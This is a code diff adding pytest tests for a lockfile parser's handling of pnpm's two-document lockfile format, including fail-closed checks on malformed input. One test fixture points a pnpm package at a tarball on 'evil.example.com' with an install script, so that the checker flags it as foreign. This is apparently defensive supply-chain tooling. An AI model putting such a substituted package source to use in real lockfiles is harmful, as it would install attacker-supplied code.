@@ -277,6 +277,117 @@ def test_pnpm_v5_is_unknown_version():
         load("pnpm-lock.v5.yaml", "pnpm-lock.yaml")
 
 
+# pnpm 12: the env lockfile document, then the main lockfile document.
+PNPM_ENV = (
+    "lockfileVersion: '9.0'\n"
+    "importers:\n"
+    "  .:\n"
+    "    configDependencies: {}\n"
+    "    packageManagerDependencies:\n"
+    "      pnpm: {specifier: 12.15.0, version: 12.15.0}\n"
+    "packages:\n"
+    "  pnpm@12.15.0:\n"
+    "    resolution: {integrity: sha512-abc}\n"
+    "snapshots:\n"
+    "  pnpm@12.15.0: {}\n"
+)
+PNPM_MAIN = (
+    "lockfileVersion: '9.0'\n"
+    "importers:\n"
+    "  .:\n"
+    "    dependencies:\n"
+    "      left-pad: {specifier: ^1.3.0, version: 1.3.0}\n"
+    "packages:\n"
+    "  left-pad@1.3.0:\n"
+    "    resolution: {integrity: sha512-def}\n"
+    "snapshots:\n"
+    "  left-pad@1.3.0: {}\n"
+)
+
+
+def pnpm_two(env: str = PNPM_ENV, main: str = PNPM_MAIN) -> str:
+    return f"---\n{env}\n---\n{main}"
+
+
+def test_pnpm_two_documents():
+    parsed = load("pnpm-lock.v9-env.yaml", "pnpm-lock.yaml")
+    assert parsed.format_version == "9.0"
+    names = set(by_name(parsed))
+    assert names == {"pnpm", "@pnpm/exe.darwin-arm64", "@pnpm/exe.linux-x64", "@next/bundle-analyzer", "esbuild", "ms"}
+    pnpm = one(parsed, "pnpm")
+    assert pnpm.version == "12.15.0" and pnpm.direct is True and pnpm.source.official
+    assert one(parsed, "@pnpm/exe.linux-x64").direct is False
+    assert one(parsed, "@next/bundle-analyzer").direct is True
+    assert one(parsed, "esbuild").direct is True
+    assert one(parsed, "ms").direct is False
+    assert all(p.source.official for p in parsed.packages)
+
+
+def test_pnpm_env_document_packages_get_every_check():
+    env = PNPM_ENV.replace(
+        "resolution: {integrity: sha512-abc}",
+        "resolution: {tarball: 'https://evil.example.com/pnpm-12.15.0.tgz'}\n    requiresBuild: true",
+    )
+    parsed = parse("pnpm-lock.yaml", pnpm_two(env=env))
+    assert foreign_names(parsed) == {"pnpm"}
+    assert one(parsed, "pnpm").has_install_script is True
+    # A new env document adds pnpm to the delta like any other package.
+    base = parse("pnpm-lock.yaml", PNPM_MAIN)
+    head = parse("pnpm-lock.yaml", pnpm_two())
+    assert [c.name for c in deps.compute_delta(base, head)] == ["pnpm"]
+
+
+def test_pnpm_single_document_still_parses_with_explicit_start():
+    assert {p.name for p in parse("pnpm-lock.yaml", f"---\n{PNPM_MAIN}").packages} == {"left-pad"}
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        pytest.param("", id="no-document"),
+        pytest.param(pnpm_two() + "\n---\n" + PNPM_MAIN, id="three-documents"),
+        pytest.param(f"---\n---\n{PNPM_MAIN}", id="empty-env-document"),
+        pytest.param(f"---\n{PNPM_ENV}\n---\n", id="empty-main-document"),
+        pytest.param(pnpm_two(main="- a\n"), id="main-not-a-mapping"),
+        pytest.param(pnpm_two(env="- a\n"), id="env-not-a-mapping"),
+        pytest.param(pnpm_two(env=PNPM_MAIN, main=PNPM_ENV), id="documents-swapped"),
+        pytest.param(pnpm_two(env=PNPM_ENV + "settings: {autoInstallPeers: true}\n"), id="env-extra-top-level-key"),
+        pytest.param(pnpm_two(env=PNPM_ENV.replace("lockfileVersion: '9.0'\n", "")), id="env-no-version"),
+        pytest.param(pnpm_two(env=PNPM_ENV.replace("  .:\n", "  web:\n")), id="env-other-importer"),
+        pytest.param(
+            pnpm_two(env=PNPM_ENV.replace("    configDependencies: {}\n", "    dependencies: {}\n")),
+            id="env-importer-unknown-key",
+        ),
+        pytest.param(
+            pnpm_two(env=PNPM_ENV.replace("version: 12.15.0}", "version: 12.16.0}")),
+            id="env-dependency-without-packages-entry",
+        ),
+        pytest.param(
+            pnpm_two(env=PNPM_ENV.replace("packages:\n", "packages:\n  pnpm@12.15.0: {}\n")),
+            id="env-duplicate-key",
+        ),
+        pytest.param(
+            pnpm_two(main=PNPM_MAIN.replace("packages:\n", "packages:\n  left-pad@1.3.0: {}\n")),
+            id="main-duplicate-key",
+        ),
+    ],
+)
+def test_pnpm_multi_document_fails_closed(text):
+    with pytest.raises(DepsError):
+        parse("pnpm-lock.yaml", text)
+
+
+@pytest.mark.parametrize("side", ["env", "main"])
+def test_pnpm_multi_document_unknown_version(side):
+    env, main = PNPM_ENV, PNPM_MAIN
+    if side == "env":
+        env = env.replace("'9.0'", "'10.0'")
+    else:
+        main = main.replace("'9.0'", "'10.0'")
+    with pytest.raises(UnsupportedVersionError):
+        parse("pnpm-lock.yaml", pnpm_two(env=env, main=main))
+
+
 # --- pyproject.toml ------------------------------------------------------------
 
 
